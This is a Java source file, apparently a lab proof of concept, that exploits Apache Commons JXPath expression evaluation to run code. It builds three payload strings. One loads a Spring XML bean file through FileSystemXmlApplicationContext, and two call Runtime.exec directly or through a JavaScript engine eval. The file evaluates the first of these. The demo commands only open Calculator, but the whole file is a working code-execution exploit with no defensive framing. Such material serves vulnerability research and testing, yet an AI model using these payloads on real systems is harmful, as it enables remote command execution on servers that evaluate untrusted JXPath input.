package com.lab;

import org.apache.commons.jxpath.JXPathContext;

import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        JXPathContext context = JXPathContext.newContext(null);
        String xml_path = Main.class.getClassLoader().getResource("").getPath() + "/rce-bean.xml";
        String new_poc = "org.springframework.context.support.FileSystemXmlApplicationContext.new('file:///" + xml_path + "')";
        String static_poc = "exec(java.lang.Runtime.getRuntime(),'open -a Calculator')";
        String static_js_poc = "eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\")";
        System.out.println(context.getValue(new_poc));
    }
}